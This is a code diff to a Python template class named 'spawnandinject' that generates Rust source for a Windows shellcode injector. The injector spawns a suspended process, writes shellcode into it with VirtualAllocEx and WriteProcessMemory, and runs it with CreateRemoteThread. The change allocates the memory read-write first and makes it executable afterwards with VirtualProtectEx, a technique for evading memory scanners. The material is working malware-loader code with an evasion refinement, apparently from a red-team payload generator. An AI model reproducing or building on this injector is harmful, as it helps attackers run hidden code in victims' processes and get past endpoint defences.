@@ -13,6 +13,7 @@ class spawnandinject:
     def imports(self) -> list[str]:
         return ['extern crate windows_sys;', 
                 'use windows_sys::Win32::System::Memory::VirtualAllocEx;',
+                'use windows_sys::Win32::System::Memory::VirtualProtectEx;',
                 'use windows_sys::Win32::System::Memory::MEM_COMMIT;',
                 'use windows_sys::Win32::System::Memory::MEM_RESERVE;',
                 'use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;',
@@ -20,7 +21,9 @@ class spawnandinject:
                 'use windows_sys::Win32::System::Threading::STARTUPINFOA;',
                 'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;',
                 'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;',
-                f'use windows_sys::Win32::System::Memory::{self.memoryPermission};',
+                'use windows_sys::Win32::System::Memory::PAGE_READWRITE;',
+                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;',
+                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;',
                 'use windows_sys::Win32::System::Threading::CreateRemoteThread;',
                 'use windows_sys::Win32::System::Threading::WaitForSingleObject;'
                 'use std::ffi::CString;',
@@ -70,7 +73,7 @@ class spawnandinject:
             std::ptr::null(), 
             shellcode.len() as usize, 
             MEM_COMMIT | MEM_RESERVE, 
-            $memoryPermission);
+            PAGE_READWRITE);
 
         let _ = {WriteProcessMemory}(
             (lpprocessinformation).hProcess, 
@@ -78,6 +81,15 @@ class spawnandinject:
             lpbuffer, 
             shellcode.len() as usize, 
             ptr::null_mut());
+
+        let mut old_protect = 0;
+        {VirtualProtectEx}(
+            (lpprocessinformation).hProcess, 
+            addr,
+            shellcode.len(),
+            $memoryPermission,
+            &mut old_protect, 
+        );
 
         let thread = {CreateRemoteThread}(
             (lpprocessinformation).hProcess, 
